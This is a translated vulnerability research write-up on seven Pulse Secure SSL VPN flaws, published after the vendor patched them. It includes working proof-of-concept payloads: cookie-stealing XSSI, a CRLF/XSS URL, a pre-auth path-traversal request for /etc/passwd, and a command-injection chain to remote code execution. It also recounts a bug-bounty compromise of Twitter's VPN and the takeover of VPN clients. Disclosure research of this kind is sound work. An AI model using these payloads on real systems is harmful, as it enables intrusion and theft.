> 原文链接: https://www.anquanke.com//post/id/185773 


# Pulse Secure SSL VPN远程代码执行漏洞利用与分析


                                阅读量   
                                **504941**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者orange，文章来源：blog.orange.tw
                                <br>原文地址：[https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html](https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t012dd07d2005bcd86e.jpg)](https://p1.ssl.qhimg.com/t012dd07d2005bcd86e.jpg)



这是攻击SSL VPN系列的最后一部分。如果您还没有阅读过以前的文章，请点击以下链接：
- [像NSA一样渗透企业内部网：在SSL VPN领导厂商的VPN上进行RCE利用](https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf)
- [攻击SSL VPN – 第1部分：Palo Alto GlobalProtect上的PreAuth RCE，以Uber作为利用案例](https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html)
- [攻击SSL VPN – 第2部分：利用Fortigate SSL VPN](https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html)
我们在Black Hat发表我们的研究之后，由于这些漏洞的严重性和巨大影响，它得到了广泛的关注和讨论。很多人都希望得到第一手消息，并想知道什么时候会发布漏洞利用代码，特别是Pulse Secure preAuth RCE的利用。

我们也在内部进行了讨论。实际上，我们可以毫无顾虑地马上发布漏洞利用细节，并获得大量的关注度。但是，作为一家安全公司，我们的责任是让世界更加安全。因此，我们决定推迟公开披露利用细节，让厂商有更多时间来打补丁！

不幸的是，前段时间有其他人披露了这些漏洞的利用细节。可以很容易在GitHub [_](https://github.com/projectzeroindia/CVE-2019-11510)和exploit-db [上找到](https://www.exploit-db.com/exploits/47297)。

我们听说有超过25个漏洞赏金计划都在收集此漏洞利用。根据Bad Packet的统计数据，众多500强企业，美国军方，政府，金融机构和大学也受此漏洞影响。甚至有10个NASA服务器都存在此漏洞。因此，过早的公开披露细节确实迫使这些企业升级其SSL VPN。

另一方面越来越多的僵尸网络在扫描公网。因此，如果尚未更新Palo Alto，Fortinet或Pulse Secure SSL VPN，请尽快更新！



## 0x00 Pulse Secure

Pulse Secure是SSL VPN的市场领导者，为IT市场提供专业的安全解决方案。我们已经研究Pulse Secure的产品很长一段时间了，因为它是Google的关键硬件基础设施，这是我们的长期目标之一。

但是，Google应用了Zero Trust安全模型，因此现在已不使用VPN。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010af3e4a35960ec31.png)

我们去年12月中旬开始研究Pulse Secure。在前两个月，我们一无所获，Pulse Secure具有良好的编码风格和安全意识，因此很难找到漏洞。这是一个有趣的比较，我们在研究FortiGate SSL VPN上发现任意文件读取漏洞（CVE-2018-13379）

Pulse Secure的开发团队也是Perl爱好者，并在C ++中编写了大量的Perl扩展。Perl和C ++之间的交互也让我们感到困惑，但是当我们花费更多时间挖掘它时，我们对它也更加熟悉了。最后，我们在2019年3月8日得到了 first blood！它是管理界面上的一个栈溢出漏洞！虽然这个bug没那么有用，但是我们的研究进展从那时起就开始了，我们发现了越来越多的bug。

我们在2019年3月22日报告了Pulse Secure PSIRT的所有发现。他们的处理很快，他们认真修复处理了这些漏洞！在与Pulse Secure进行了多次电话会议后，他们在一个月内修复了所有漏洞，并于2019年4月24日发布了补丁。

这是与Pulse Secure的一次良好合作合作。从我们的角度来看，Pulse Secure是我们报告漏洞的所有SSL VPN供应商中最负责任的供应商！



## 0x01挖掘的漏洞

我们总共发现了7个漏洞，后面将介绍每一个漏洞，但更多关注CVE-2019-11510和CVE-2019-11539这两个漏洞。
- CVE-2019-11510 – Pre-auth任意文件读取漏洞
- CVE-2019-11542 – 管理员授权后堆栈缓冲区溢出漏洞
- CVE-2019-11539 – 管理员授权后命令注入漏洞
- CVE-2019-11538 – 用户授权后通过NFS进行任意文件读取漏洞
- CVE-2019-11508 – 用户通过NFS进行授权后任意文件写入漏洞
- CVE-2019-11540 – 授权后跨站脚本包含漏洞
- CVE-2019-11507 – 授权后跨站脚本攻击


## 0x02 受影响版本
- Pulse Connect Secure 9.0R1 – 9.0R3.3
- Pulse Connect Secure 8.3R1 – 8.3R7
- Pulse Connect Secure 8.2R1 – 8.2R12
- Pulse Connect Secure 8.1R1 – 8.1R15
- Pulse Policy Secure 9.0R1 – 9.0R3.3
- Pulse Policy Secure 5.4R1 – 5.4R7
- Pulse Policy Secure 5.3R1 – 5.3R12
- Pulse Policy Secure 5.2R1 – 5.2R12
- Pulse Policy Secure 5.1R1 – 5.1R15


## 0x03 漏洞分析

### <a class="reference-link" name="1.CVE-2019-11540%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"></a>1.CVE-2019-11540：跨站脚本包含漏洞

脚本/dana/cs/cs.cgi用于在JavaScript中呈现会话ID，当内容类型设置为：

```
application/x-javascript
```

我们可以执行XSSI攻击来窃取DSID cookie！

更糟糕的是，Pulse Secure SSL VPN中的CSRF保护基于DSID。有了这个XSSI，我们可以绕过所有的CSRF保护！

PoC如下：

```
&lt;!-- http://attacker/malicious.html --&gt;

&lt;script src="https://sslvpn/dana/cs/cs.cgi?action=appletobj"&gt;&lt;/script&gt;
&lt;script&gt;
    window.onload = function() `{`
        window.document.writeln = function (msg) `{`
            if (msg.indexOf("DSID") &gt;= 0) alert(msg)
        `}`
        ReplaceContent()
    `}`
&lt;/script&gt;
```

### <a class="reference-link" name="2.CVE-2019-11507%EF%BC%9A%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"></a>2.CVE-2019-11507：跨站脚本攻击

有一个CRLF注入

```
/dana/home/cts_get_ica.cgi
```

由于这个注入漏洞，我们可以伪造任意HTTP头并注入恶意HTML内容。

PoC如下：

```
https://sslvpn/dana/home/cts_get_ica.cgi
?bm_id=x
&amp;vdi=1
&amp;appname=aa%0d%0aContent-Type::text/html%0d%0aContent-Disposition::inline%0d%0aaa:bb&lt;svg/onload=alert(document.domain)&gt;
```

### <a class="reference-link" name="3.CVE-2019-11538%EF%BC%9A%E9%80%9A%E8%BF%87NFS%E8%BF%9B%E8%A1%8C%E6%8E%88%E6%9D%83%E5%90%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"></a>3.CVE-2019-11538：通过NFS进行授权后任意文件读取

以下两个漏洞（CVE-2019-11538和CVE-2019-11508）不会影响默认配置。仅当管理员为VPN用户配置NFS共享时才会出现。

如果攻击者可以控制远程NFS服务器上的任何文件，他只需创建指向任何文件的符号链接，例如

```
/etc/passwd
```

并从Web界面读取它，漏洞根本原因是NFS的实现将远程服务器挂载为真正的Linux目录，并且脚本

```
/dana/fb/nfs/nfb.cgi
```

不检查所访问的文件是否是符号链接！

### <a class="reference-link" name="4.CVE-2019-11508%EF%BC%9A%E9%80%9A%E8%BF%87NFS%E8%BF%9B%E8%A1%8C%E6%8E%88%E6%9D%83%E5%90%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"></a>4.CVE-2019-11508：通过NFS进行授权后任意文件写入

这个有点类似于前一个漏洞，但有不同的攻击向量（attack vector）！

当攻击者通过Web界面将ZIP文件上载到NFS时，脚本

```
/dana/fb/nfs/nu.cgi
```

不会清理ZIP中的文件名，因此，攻击者可以构建恶意ZIP文件并使用

```
../
```

文件名遍历路径！一旦Pulse Secure解压缩，攻击者就可以将任何他想要的内容上传到任何路径！

### <a class="reference-link" name="5.CVE-2019-11542%EF%BC%9A%E7%AE%A1%E7%90%86%E5%91%98%E6%8E%88%E6%9D%83%E5%90%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"></a>5.CVE-2019-11542：管理员授权后缓冲区溢出漏洞

在以下Perl模块实现中存在基于堆栈的缓冲区溢出漏洞：
- DSHC :: ConsiderForReporting
- DSHC :: isSendReasonStringEnabled
- DSHC :: getRemedCustomInstructions
这些实现用于

```
sprintf
```

连接字符串而不进行任何长度检查，就会导致缓冲区溢出，这个bug可以在很多地方触发

```
/dana-admin/auth/hc.cgi
```

PoC：

```
https://sslvpn/dana-admin/auth/hc.cgi
?platform=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&amp;policyid=0
```

可以从输出观察到段错误：

```
dmesg
cgi-server[22950]: segfault at 61616161 ip 0000000002a80afd sp 00000000ff9a4d50 error 4 in DSHC.so[2a2f000+87000]
```

### <a class="reference-link" name="6.CVE-2019-11510%EF%BC%9APre-auth%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"></a>6.CVE-2019-11510：Pre-auth任意文件读取漏洞

这是最严重的一个漏洞，Pulse Secure开发自己的Web服务器和架构，原始路径验证非常严格。但是，从版本8.2开始，Pulse Secure引入了一项名为HTML5 Access的新功能，它是一种用于通过浏览器与Telnet，SSH和RDP交互的功能。由于这个新功能，原始路径验证变得松散。

为了处理静态资源，Pulse Secure创建了一个新的IF-CONDITION来扩展最初的严格路径验证。错误地使用了request-&gt;uri

和request-&gt;filepath，因此我们可以指定：

```
/dana/html5acc/guacamole/
```

查询字符串的末尾以绕过验证并request-&gt;filepath生成要下载的任何文件！

为了读取任意文件，必须再次指定路径：

```
/dana/html5acc/guacamole/
```

路径的中间位置，否则，只能下载有限的文件扩展名，例如.json，.xml或.html。

由于此漏洞会被在野利用，因此不再发布具体的payload：

```
import requests

r = requests.get('https://sslvpn/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/')
print r.content
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0152131c2e9114f0ea.png)

### <a class="reference-link" name="7.CVE-2019-11539%EF%BC%9A%E6%8E%88%E6%9D%83%E5%90%8E%EF%BC%88admin%EF%BC%89%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"></a>7.CVE-2019-11539：授权后（admin）命令注入

最后一个是管理接口上的命令注入，我们很早就发现了这个漏洞，但最初找不到利用它的方法。当我们在拉斯维加斯时，我的一个朋友告诉我他之前发现了同样的问题，但他没有找到利用它的方法，因此他没有向供应商报告。

但是，我们做到了，我们以非常聪明的方式利用了它:)

这个漏洞的触发原因非常简单。这是一段/dana-admin/diag/diag.cgi的代码片段：

```
# ...
$options = tcpdump_options_syntax_check(CGI::param("options"));

# ...
sub tcpdump_options_syntax_check `{`
  my $options = shift;
  return $options if system("$TCPDUMP_COMMAND -d $options &gt;/dev/null 2&gt;&amp;1") == 0;
  return undef;
`}`
```

常明显的options参数命令注入

但是，并没有那么简单被利用，为了避免潜在的漏洞，Pulse Secure在其产品上应用了大量的hardenings工具！比如系统完整性检查，只读文件系统和挂载所有危险的Perl调用模块，比如：system，open，backtick

这个模块被DSSAFE.pm调用，它实现了自己的命令行解析器，并重新实现了Perl中的I / O重定向。这是Gist上的[代码片段](https://gist.github.com/orangetw/d8df11b147629bb320e7db903c7e7147)。

```
# ...
@EXPORT = qw(open popen ppopen close system psystem exec backtick pbacktick
             maketemp untaint is_tainted);
# ...
sub __parsecmd `{`
    my $cmd = shift;
    my @args = quotewords('s+', 1, $cmd);

    my @env = (); # currently not used. pending review.
    my @xargs = (); # arguments of the command
    my ($xcmd, $fout, $fin, $ferr, $mout, $min, $merr, $rd2);

    while (@args) `{`
        my $arg = shift @args;
        next if (length($arg) == 0);
        unless (defined $xcmd) `{`
            if ($arg =~ /^(w+)=(.+)$/) `{`
                push @env, `{`$1 =&gt; $2`}`;
                next;
            `}` elsif ($arg =~ /^[^/a-zA-Z]/) `{`
                __log("Invalid command: $cmd"); # must be / or letter
                return undef;
            `}`
            $xcmd = untaint($arg);
            next;
        `}`
        if ($arg =~ /^(2|1)&gt;&amp;(2|1)$/) `{`
            $rd2 = $2;
        `}` elsif ($arg =~ /^(1|2)?(&gt;&gt;?)([^&gt;].*)?$/) `{`
            if ($1 and $1 == 2) `{`
                ($merr, $ferr) = ($2, $3 || untaint(shift @args));
            `}` else `{`
                ($mout, $fout) = ($2, $3 || untaint(shift @args));
            `}`
        `}` elsif ($arg =~ /^(&lt;)(.+)?$/) `{`
            ($min, $fin) = ($1, $2 || untaint(shift @args));
        `}` elsif ($arg =~ /^(&gt;&amp;)(.+)?$/) `{`
            $fout = $ferr = $2 || untaint(shift @args);
            $mout = $merr = "&gt;";
        `}` elsif ($arg =~ /^('|")(.*)('|")$/) `{`
            push @xargs, $2; # skip checking meta between quotes
#               `}` elsif ($arg =~ /[$&amp;*()`{``}`[]`;|?n~&lt;&gt;]/) `{`
        `}` elsif ($arg =~ /[&amp;*()`{``}`[]`;|?n~&lt;&gt;]/) `{`
            __log("Meta characters not allowed: ($arg) $cmd");
            return undef;
        `}` elsif ($arg =~ /W$/) `{`
            __log("Meta characters not allowed: ($arg) $cmd");
        `}` else `{`
            push @xargs, untaint($arg);
        `}`
    `}`
    if ($rd2) `{`
        # redirect both 2 and 1 to the same place
        if (defined $fout) `{`
            ($ferr, $merr) = ($fout, $mout);
        `}` elsif (defined $ferr) `{`
            ($fout, $mout) = ($ferr, $merr);
        `}` elsif ($rd2 == 1) `{`
            open STDERR, "&gt;&amp;STDOUT" or die "cannot dup STDERR to STDOUT:$!n";
            select STDERR; $|=1;
            select STDOUT; $|=1;
        `}` elsif ($rd2 == 2) `{`
            open STDOUT, "&gt;&amp;STDERR" or die "cannot dup STDOUT to STDERR:$!n";
            select STDOUT; $|=1;
            select STDERR; $|=1;
        `}`
    `}`
    unless ($xcmd) `{`
        __log("Command parsing error: $cmd");
        return undef;
    `}`

    # need to untaint $cmd. otherwise the whole hash will be tainted.
    # but $cmd will never be used for exec anyway, only for debug.
    my $params = `{` cmd =&gt; untaint($cmd), xcmd =&gt; $xcmd, xargs =&gt; @xargs `}`;
    $params-&gt;`{`fstdout`}` = $fout if $fout;
    $params-&gt;`{`mstdout`}` = $mout if $mout;                                
    $params-&gt;`{`fstderr`}` = $ferr if $ferr;
    $params-&gt;`{`mstderr`}` = $merr if $merr;
    $params-&gt;`{`fstdin`}` = $fin if $fin;
    $params-&gt;`{`mstdin`}` = $min if $min;

    return $params;
`}`

# ...
sub system `{`
    return CORE::system(@_) if (@_ &gt; 1);
    my $params = __parsecmd(join(' ', @_));
    return -1 unless ($params);

    # We want SIGINT and SIGQUIT to be ignored in the parent
    # while the child is running.  However, we want the child
    # to get these signals -- so we declare a block around
    # the code that ignores SIGINT such that the child will
    # exec with the signals turned on.
    `{`
        local $SIG`{`INT`}` = 'IGNORE';
        local $SIG`{`QUIT`}` = 'IGNORE';
        flush STDOUT; flush STDERR; flush STDIN;

        my $pid = fork;
        unless (defined $pid) `{`
            __log("system: cannot fork $!");
            return -1;
        `}`
        if ($pid) `{`
            waitpid $pid, 0;
            return $?;
        `}`
    `}`
    return __execo $params;
`}`
```

从代码片段中，可以看到它替换原始system片段并进行大量__parsecmd检查，它还会阻止许多危险输入，例如：

```
[&amp;*()`{``}`[]`;|?n~&lt;&gt;]
```

检查非常严格，因此我们无法执行任何命令注入，我们设想了几种绕过它的方法，我想到的第一件事就是参数注入。

我们列出了TCPDUMP支持的所有参数，并发现-z postrotate-command可能会有用。但令人遗憾的是，TCPDUMP只对

Pulse Secure（v3.9.4，2005年9月）支持这个功能，所以我们失败了:(

在检查系统时，我们发现虽然webroot是只读的，但可以仍然利用.Pulse Secure缓存机制的/data/runtime/tmp/tt/缓存模板以加速脚本输出。

所以我们下一步尝试是通过-w write-file参数将文件写入模板缓存目录。但是，似乎不可能在PCAP和PCAP中编写多语言文件。

我们试图深入研究DSSFAFE.pm的实现，看看是否有任何可以利用的东西。在这里，我们在命令行解析器中发现了一个问题。如果插入不完整的I / O重定向，则重定向部分的其余部分将被截断。虽然这是一个小小的bug，但它帮助我们重新控制了I / O重定向！但是，无法生成有效Perl脚本的问题仍然困扰着我们。

我们被困在这里，很难生成有效的Perl脚本`STDOUT`，可以只编写Perl `STDERR`吗？确实可以，当通过`TCPDUMP` -r read-file读取不存在的文件时，它显示如下错误：

> tcpdump: [filename]: No such file or directory

看来我们可以部分地控制错误信息，然后我们尝试了文件名`print 123#`，神奇的事情发生了！

```
$ tcpdump -d -r 'print 123#'
  tcpdump: print 123#: No such file or directory

$ tcpdump -d -r 'print 123#' 2&gt;&amp;1 | perl –
  123

```

错误消息现在变为有效的Perl脚本，为什么会这样？

[![](https://p5.ssl.qhimg.com/t017a00aa51d26fc0b2.png)](https://p5.ssl.qhimg.com/t017a00aa51d26fc0b2.png)

Perl支持GOTO标签，因此tcpdump:`成为了Perl中的有效标签，然后，用标签对其余部分进行comment，有了这个技巧，我们现在可以生成任何有效的Perl脚本！

最后，我们使用不完整的I / O符号`&lt;`来欺骗`DSSAFE.pm`命令解析器并将其重定向`STDERR`到缓存目录中！

这是最终的漏洞利用PoC：

```
-r$x="ls /",system$x# 2&gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &lt;
```

连接命令如下所示：

```
/usr/sbin/tcpdump -d 
 -r'$x="ls /",system$x#'
 2&gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &lt; 
 &gt;/dev/null
 2&gt;&amp;1
```

生成的`setcookie.thtml.ttc`内容如下：

```
tcpdump: $x="ls /",system$x#: No such file or directory
```

现在就可以获取相应的页面来执行命令：

```
$ curl https://sslvpn/dana-na/auth/setcookie.cgi
 boot  bin  home  lib64       mnt      opt  proc  sys  usr  var
 data  etc  lib   lost+found  modules  pkg  sbin  tmp 
 ...
```

到目前为止，这个命令注入的完整利用就结束了，但是，我们认为可能有另一种创造性的方式来利用这个漏洞，如果你找到了，请告诉我！



## 0x04 对twitter的漏洞利用实例

Pulse Secure在2019年4月24日修补了所有漏洞，我们一直在扫描公网，以衡量每家大公司的响应时间，Twitter就是其中之一。他们的漏洞赏金奖励计划赏金很高，对白帽子黑客很友好。

但是，在补丁发布后立即利用是不合适的，所以我们等待了30天让Twitter升级他们的SSL VPN。

[![](https://p2.ssl.qhimg.com/t01e4a314634a085ffc.png)](https://p2.ssl.qhimg.com/t01e4a314634a085ffc.png)

我们不得不说，那段时间我们很紧张，我们每天早上做的第一件事就是检查Twitter是否升级了他们的SSL VPN！对我们来说这是一个难忘的时刻。

我们在2019年5月28日开始攻击Twitter，在这次行动中，我们遇到了几个障碍。第一个是，虽然我们可以获得Twitter员工的明文密码，但由于双因素身份验证，我们仍然无法登录他们的SSL VPN。在这里，我们建议两种方法绕过它。第一个是我们观察到Twitter使用了Duo的解决方案。该手册中提到：

> Duo应用程序的安全性与您的密钥（skey）的安全性有关，要像保护任何敏感凭证一样保护它。不要与未经授权的个人分享或在任何情况下通过电子邮件发送给任何人！

因此，如果我们可以从系统中提取密钥，我们可以利用Duo API绕过2FA。但是，我们找到了绕过它的更快捷的方法。Twitter启用了漫游会话功能，该功能用于增强移动性并允许来自多个IP位置的会话。

由于这个“ 方便 ”的功能，我们可以下载会话数据库并伪造我们的cookie登录他们的系统！

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014bff1a8b83187774.png)

到目前为止，我们可以访问Twitter Intranet。不过，我们的目标是实现代码执行！这比仅仅访问内网更重要。所以我们想利用命令注入漏洞（CVE-2019-11539）。

在这里我们又遇到了另一个障碍，这是一个受限制的管理界面！

正如我们之前提到的，我们的障碍在于管理界面，但出于安全考虑，大多数公司都禁用此界面，因此我们需要另一种方式来访问管理页面。如果您仔细阅读了我们之前的文章，您可能会想起“ WebVPN ”功能！WebVPN是一种有助于连接到任何地方的代理。

在这里，我们使用一个小技巧来绕过SSRF保护。

[![](https://p5.ssl.qhimg.com/t01cbf4bb3769f4cdb7.png)](https://p5.ssl.qhimg.com/t01cbf4bb3769f4cdb7.png)

通过SSRF漏洞，我们现在可以进入管理界面！然后，最后一个障碍出现了。我们没有管理员的任何明文密码。当Perl想要与本机过程交换数据时，例如C ++中的Perl扩展或Web服务器，它使用缓存来存储数据。问题是，Pulse Secure忘记在交换后清除敏感数据，这就是我们可以在缓存中获取明文密码的原因。但实际上，大多数管理人员只是第一次登录他们的系统，所以很难获得经理的明文密码。我们唯一得到的是sha256(md5_crypt(salt, …))格式的密码哈希

如果你破解过哈希，你会知道它有多难。所以我们推出了一个72核心的AWS来解决这个问题。<br>[![](https://p3.ssl.qhimg.com/t01f01c97dd00fae471.png)](https://p3.ssl.qhimg.com/t01f01c97dd00fae471.png)

我们破解了哈希并成功获得了RCE！我认为我们很幸运，因为根据我们的观察，Twitter员工有一个非常强大的密码保护策略。但似乎策略不适用于经理level的员工，他们的的密码长度只有十位，且第一个字符是B，它处于破解队列字符的前面，因此我们可以在3小时内破解哈希。

我们向Twitter报告了我们的所有研究成果，并从中获得了最高的赏金。虽然我们无法证明这一点，但这似乎是Twitter上的第一个远程代码执行！



## 0x05 修复建议

如何减轻此类攻击？在这里我们提出几点建议：

客户端证书。这也是最有效的方法，如果没有有效的证书，恶意连接将在SSL协商期间被删除！

多因素身份验证。虽然我们这次攻入了Twitter 2FA，但是在适当的设置下，MFA仍然可以减少攻击面

启用完整日志审核

最重要的是，始终保持您的系统更新！



## 0x06 接管所有VPN客户端

我们的公司DEVCORE在亚洲提供最专业的红队攻击服务。在这个部分，让我们谈谈如何让红队利用此漏洞！

我们知道，在红队攻击中，拿下个人电脑更有价值，有一些老方法可以通过SSL VPN破坏VPN客户端，例如更换VPN代理。

在我们的研究过程中，我们发现了一个新的攻击媒介来接管所有客户。就是“ 登录脚本 ”功能，它几乎出现在每个SSL VPN中，例如OpenVPN，Fortinet，Pulse Secure ……等等。它可以执行相应的脚本来安装网络文件系统，或者在建立VPN连接后更改路由表。

由于这种“ 黑客友好 ”功能，一旦我们获得管理员权限，我们就可以利用此功能感染所有VPN客户端！这里以Pulse Secure为例，演示如何不仅可以攻击SSL VPN，还可以接管所有连接的客户端：

[![](https://p2.ssl.qhimg.com/t01f9ee48b3c9c9f7e7.png)](https://p2.ssl.qhimg.com/t01f9ee48b3c9c9f7e7.png)

成功拿到SSID的cookie

[![](https://p4.ssl.qhimg.com/t01666a480c3e33adfc.png)](https://p4.ssl.qhimg.com/t01666a480c3e33adfc.png)

在浏览器替换cookie

[![](https://p5.ssl.qhimg.com/t01245cbea1b248dbfe.png)](https://p5.ssl.qhimg.com/t01245cbea1b248dbfe.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011f166df2c959ef93.png)

写入执行命令

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f1499682fdfe1656.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cc9fbdcfbf9970cc.png)

客户端连接VPN，成功命令执行

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e4dfffdc980aded7.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0185fc39a3e909fbdd.png)



## 0x07 总结

这是攻击SSL VPN系列的最后一部分！根据我们的研究结果，SSL VPN是一个巨大的攻击面，很少有安全研究人员深入研究这个领域，显然，它值得更多的关注。我们希望这个系列的研究可以鼓励其他研究人员参与这一领域，提高企业的安全性！

感谢我们遇到的所有人，我们将在未来发表更多有意思的研究:)
